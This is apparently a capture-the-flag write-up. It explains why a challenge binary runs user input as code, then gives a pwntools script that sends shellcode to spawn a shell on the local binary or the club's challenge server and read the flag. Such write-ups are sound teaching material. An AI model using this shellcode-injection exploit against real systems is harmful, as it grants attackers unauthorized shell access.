# Reconnaissance
## C Review
The c indicates two buffers being set up. `buf0` is not used anywhere, but `input` is cast to a pointer which is called as a function later in `main()`! This will be our attack vector. We can write shell code into `input` and it will be executed later.  

Small note: Because the `printf()` call doesn't include a new line character, we can't use `recvline()` for our program. We'll neeed to use `recvuntil()` and wait for the end of the expected string.

# Script
To start testing, we are going to run our script on the ELF we were given for the challenge. We can load it like this:
```{python}
from pwn import *

EXE = ELF("./challenge/chall_6")

context.binary = EXE
context.terminal = ['xterm', '-e']
context.log_level = "DEBUG"

def conn(useExe=False):
	if useExe:
		# r = gdb.debug(EXE.path, "\n".join(breakpoints))
		r = process([EXE.path])
	else:
		r = remote('pwn.osucyber.club',13377)
	return r
```
Here we are doing a couple of things. We are importing the `pwn` library to use as our primary tool for both working on the local file and the challenge server. Then, we use `pwn`'s `ELF` module to put the executable into a variable `EXE`. Then we set up a few things for `pwn`, most importantly `context.log_level = "DEBUG"` because this will give us verbose information about what we send and recieve with `pwn`.

The `conn()` function being set up here simply allows us to minimally change the program to run remotely when we are finished with testing. Calling this function with `True` as a parameter connects to the local installation of the server executable, whose path is written in the definition of the `EXE` variable. Then once our testing is completed, we can call `conn(False)` to make a connection to the remote server.

Next, we connect and craft and send our payload:
```{python}
io = conn(True)
# Wait for the process to send "Ever been to the Dreese Lab basement?" and respond to move on
io.recvuntil(b'"Ever been to the Dreese Lab basement?"')
io.send(b'no, i haven\'t\n')

# Create a payload with shellcode to spawn us a shell
payload = asm(shellcraft.sh())
payload += b'\n'
io.send(payload)
io.interactive()

io.close()
```

If this spawns a terminal, then our code worked! We can run it again on the server then call `ls` and `cat flag.txt` in the interactive shell!